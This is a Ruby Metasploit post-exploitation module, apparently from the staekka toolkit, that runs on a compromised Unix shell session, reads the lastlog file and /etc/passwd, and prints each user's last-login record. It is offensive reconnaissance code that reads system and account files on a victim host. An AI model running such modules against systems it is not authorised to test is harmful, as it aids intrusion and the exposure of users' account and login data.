# $LOAD_PATH.push(staekka_path() + '/external/bindata/lib')
#$LOAD_PATH.push "#{ENV['STAEKKA_PATH']}/external/bindata/lib"
#$LOAD_PATH.push File.expand_path(File.join(Msf::Config.staekka_path, 'external', 'bindata', 'lib' ))


require 'bindata'
require 'time'
require 'ipaddr'
require 'tempfile'


require 'msf/core'
require 'msf/core/post/file'
require 'core/post/staekka'
require 'core/post/staekka/file'
require 'core/post/staekka/unix'
require 'core/post/unix/lastlog'
require 'core/post/unix/commands'



class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  include Msf::Post::Staekka::Unix
  include Msf::Post::Unix::Commands
  include Msf::Post::Updatedb

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Dump Lastlog Logfiles',
        'Description'   => %q(Dump lastlog  log files as text),
        'Author'        => [ 'jot'],
        'SessionTypes'  => [ 'shell' ]
      ))
    register_options(
      [
        OptBool.new('USE_UPDATEDB',  [ false, 'Use an updatedb database and search for filenames instead of full path', true]),
        OptString.new('FILES',  [ false, 'A special log file']),
      ], self.class)
  end

  def run
    all_log_files.each do |file|
      ################
      # check file permissions
      next unless  permissions?(file)
      ################
      # size check/warning
      size = filesize(file)
      if size.nil? || size == 0
        vprint_warning "#{file}: not readable or empty"
        next
      elsif size > 1024 * 1024 * 1024 # 1G
        print_error "#{file}: file size (#{size}) more than 1 G: This would fail and crash the session! Cannot download"
        print_error "#{file} will be igroned due to this size"
        next
      elsif size > 1024 * 1024 * 100  # 100 MB
        print_warning "#{file}: file size (#{size}) more than 100Mb: This will need long time and lot of recourses"
        print_error "#{file} will be igroned due to this size"
        next
      elsif size > 1024 * 1024 * 10           # 10 MB
        # 10 MB
        print_warning "#{file}: file size (#{size}) more than 10Mb: This will need a while"
      elsif size > 1024 * 1024                                # 1MB
        print_warning "#{file}: file size (#{size}) more than 1Mb: This might need some time"
      else  # less
        # OK
      end

      dump_lastlog(file)
      #
    end
  end

  def all_log_files
    out = []
    if datastore['FILES']
      files = datastore['FILES'].split(" ")
    else
      files = log_files_lastlog
    end

    files.flatten!
    files.compact!
    files.uniq!
    files.each do |file|
      file.strip!
      next if file.empty?
      if (file.start_with? '/') or  (file.start_with? './') or (file.start_with? '..')
        if exists?(file)
          out << file
        end
      else
        # search updatedb
        out.concat find_files(file)
      end
    end
    out
  end

  def log_files_lastlog
    [ "/var/log/lastlog",          # Linux
      "/var/adm/lastlog",      # Solaris
    ]
  end

  def permissions?(file)
    if readable?(file)
      true
    else
      print_error "Need read  permissions for #{file} for changing it! Cannot go on"
      print_error "This could also be a known bug of this check. In this case you simply need to re-run this module"
      false
    end
  end

  def dump_lastlog(file)
    logfile = StringIO.new(read_file(file, true, false))
    lastlog = LastLog.new
    lastlog.read_passwd(read_file("/etc/passwd", true, false))

    out = ''
    lastlog.each_entry(logfile) do | lastlog, uid |
      tmp = lastlog.print_entry(uid)
      if tmp.start_with? "uid=" and tmp.strip.end_with? "**Never logged in**"
        next
      end
      out << tmp
    end
    print_status out
  end

end

